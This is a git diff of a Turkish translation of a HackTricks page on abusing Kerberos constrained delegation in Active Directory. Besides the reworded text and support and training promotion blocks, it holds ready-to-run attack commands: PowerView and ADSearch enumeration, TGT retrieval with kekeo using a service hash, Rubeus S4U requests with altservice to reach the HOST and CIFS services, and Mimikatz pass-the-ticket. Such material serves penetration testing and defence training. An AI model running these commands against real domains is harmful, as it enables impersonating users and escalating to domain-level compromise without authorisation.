@@ -1,19 +1,36 @@
-# Kısıtlanmış Delegeleme
+# Kısıtlı Delegasyon
 
-Bu yöntemle bir **Etki Alanı yöneticisi**, bir makinenin bir **hizmetine karşı bir kullanıcı veya bilgisayarın taklit edilmesine izin verebilir**.
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-* **Kullanıcı için Hizmet (**_**S4U2self**_**):** Bir **hizmet hesabı**, [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) içeren bir _userAccountControl_ değerine sahipse, başka herhangi bir kullanıcı adına kendisi (hizmet) için bir TGS alabilir.
-* **Proxy için Kullanıcı için Hizmet(**_**S4U2proxy**_**):** Bir **hizmet hesabı**, **msDS-AllowedToDelegateTo**'da belirtilen hizmete herhangi bir kullanıcı adına bir TGS alabilir. Bunun için önce o kullanıcıdan kendisine bir TGS alması gerekmektedir, ancak diğerini istemeden önce S4U2self'i kullanarak o TGS'yi alabilir.
+<details>
 
-**Not**: Bir kullanıcı AD'de '_Hesap hassas ve delege edilemez_' olarak işaretlenmişse, onları **taklit edemezsiniz**.
+<summary>HackTricks'i Destekleyin</summary>
 
-Bu, eğer bir hizmetin hash'ini **ele geçirirseniz**, kullanıcıları **taklit edebilir** ve **hizmete erişim** elde edebilirsiniz (mümkün olan **hak yükseltme**).
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
-Dahası, sadece kullanıcının taklit edebildiği hizmete değil, **herhangi bir hizmete de erişiminiz olacak**, çünkü SPN (istenen hizmet adı) kontrol edilmiyor, sadece yetkiler kontrol ediliyor. Bu nedenle, **CIFS hizmetine** erişiminiz varsa, Rubeus'ta `/altservice` bayrağını kullanarak **HOST hizmetine** de erişebilirsiniz.
+</details>
+{% endhint %}
 
-Ayrıca, **DC üzerindeki LDAP hizmetine** erişim, bir **DCSync** saldırısını gerçekleştirmek için gereklidir.
+## Kısıtlı Delegasyon
 
-{% code title="Sorgula" %}
+Bunu kullanarak bir Alan yöneticisi, bir bilgisayarın bir makinenin **hizmeti** karşısında bir **kullanıcı veya bilgisayar** olarak **taklit etmesine** **izin verebilir**.
+
+* **Kullanıcı için Hizmet (S4U2self):** Eğer bir **hizmet hesabı** _userAccountControl_ değeri [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) içeriyorsa, o zaman kendisi (hizmet) adına herhangi bir kullanıcı için bir TGS alabilir.
+* **Kullanıcı için Proxy Hizmeti (S4U2proxy):** Bir **hizmet hesabı**, **msDS-AllowedToDelegateTo**'da ayarlanan hizmet için herhangi bir kullanıcı adına bir TGS alabilir. Bunu yapmak için, önce o kullanıcıdan kendisine bir TGS alması gerekir, ancak diğerini talep etmeden önce bu TGS'yi almak için S4U2self kullanabilir.
+
+**Not**: Eğer bir kullanıcı AD'de ‘_Hesap hassas ve devredilemez_’ olarak işaretlenmişse, onu **taklit edemezsiniz**.
+
+Bu, eğer **hizmetin hash'ini ele geçirirseniz**, **kullanıcıları taklit edebileceğiniz** ve onların adına **hizmete erişim** elde edebileceğiniz anlamına gelir (mümkün **privesc**).
+
+Ayrıca, **kullanıcının taklit edebileceği hizmete** erişiminiz olmayacak, aynı zamanda **herhangi bir hizmete** de erişiminiz olacak çünkü SPN (istenen hizmet adı) kontrol edilmez, sadece ayrıcalıklar kontrol edilir. Bu nedenle, eğer **CIFS hizmetine** erişiminiz varsa, Rubeus'ta `/altservice` bayrağını kullanarak **HOST hizmetine** de erişiminiz olabilir.
+
+Ayrıca, **DC üzerindeki LDAP hizmet erişimi**, bir **DCSync**'i istismar etmek için gereklidir.
+
+{% code title="Sıralama" %}
 ```bash
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -22,7 +39,9 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 #ADSearch
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
-{% code title="TGT'yi Al" %}
+{% endcode %}
+
+{% code title="TGT Al" %}
 ```bash
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -44,9 +63,9 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140
 {% endcode %}
 
 {% hint style="warning" %}
-TGT biletini veya RC4 veya AES256'yı sistem olmadan elde etmenin diğer yolları vardır, örneğin Yazıcı Hatası ve sınırlamaları kaldırma, NTLM yönlendirme ve Active Directory Sertifika Hizmeti kötüye kullanımı.
+**TGT biletini** veya **RC4** ya da **AES256**'yı elde etmenin **başka yolları** vardır, bunlar arasında Yazıcı Hatası ve kısıtlanmamış delegasyon, NTLM ile iletim ve Active Directory Sertifika Servisi istismarı bulunmaktadır.
 
-TGT biletine (veya karmasına) sahip olmanız durumunda, tüm bilgisayarı tehlikeye atmadan bu saldırıyı gerçekleştirebilirsiniz.
+**Sadece bu TGT biletine (veya hash'ine) sahip olarak, tüm bilgisayarı tehlikeye atmadan bu saldırıyı gerçekleştirebilirsiniz.**
 {% endhint %}
 
 {% code title="Rubeus Kullanımı" %}
@@ -66,6 +85,8 @@ TGT biletine (veya karmasına) sahip olmanız durumunda, tüm bilgisayarı tehli
 #Load ticket in memory
 .\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
 ```
+{% endcode %}
+
 {% code title="kekeo + Mimikatz" %}
 ```bash
 #Obtain a TGT for the Constained allowed user
@@ -79,18 +100,19 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 ```
 {% endcode %}
 
-[**Daha fazla bilgi için ired.team'e bakın.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Daha fazla bilgi için ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin.**
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın.**
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
